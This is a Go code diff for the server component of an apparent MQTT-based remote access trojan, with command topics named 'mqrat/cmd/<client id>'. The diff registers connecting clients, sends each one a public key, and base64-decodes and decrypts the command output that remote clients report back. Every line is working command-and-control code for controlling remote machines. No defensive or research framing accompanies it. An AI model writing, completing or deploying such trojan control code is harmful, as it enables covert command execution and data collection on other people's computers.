@@ -2,14 +2,18 @@ package network
 
 import (
 	"MQServer/cipher"
+	"encoding/base64"
+	"fmt"
 	"log"
 	"strings"
+	"time"
 
 	MQTT "github.com/eclipse/paho.mqtt.golang"
 	"github.com/google/uuid"
 )
 
-// Clients contains the ID's of connected clients
+// Clients contains the ID's of connected clients mapped to it's base topic name
+// ie. if client id is 1234 then it's topic name will be mqrat/cmd/1234
 var Clients = make(map[string]string)
 
 var commandProcessed = make(chan bool)
@@ -45,6 +49,12 @@ func translateMessage(client MQTT.Client, message MQTT.Message) {
 
 			// Save client ID on memory
 			Clients[remoteClientID] = topic
+
+			// Wait some time before sending the public key
+			time.Sleep(time.Second * 3)
+
+			// Send public key to specified client
+			sendPublicKey(remoteClientID)
 		} else {
 			log.Printf("[ERROR] Payload not recognized: %v", payload)
 		}
@@ -55,11 +65,20 @@ func translateMessage(client MQTT.Client, message MQTT.Message) {
 
 		if subTopic == outputTopic {
 			// Decrypt command response
-			decryptedPayload, decErr := cipher.Decrypt(payload)
-			if decErr == nil {
-				log.Printf("Decrypted response from %v: %v", remoteClientID, string(decryptedPayload))
+			fmt.Printf("[RESPONSE] %v\n", payload)
+
+			var dest []byte = make([]byte, 8192)
+
+			_, decodeFail := base64.StdEncoding.Decode(dest, []byte(payload))
+			if decodeFail != nil {
+				fmt.Printf("[ERROR] Failed to decode payload: %v\n", decodeFail)
 			} else {
-				log.Printf("Response from %v: %v", remoteClientID, payload)
+				decryptedPayload, decErr := cipher.DecryptBytes(dest)
+				if decErr == nil {
+					log.Printf("Decrypted response from %v: %v", remoteClientID, string(decryptedPayload))
+				} else {
+					log.Printf("Response from %v: %v", remoteClientID, payload)
+				}
 			}
 
 			commandProcessed <- true
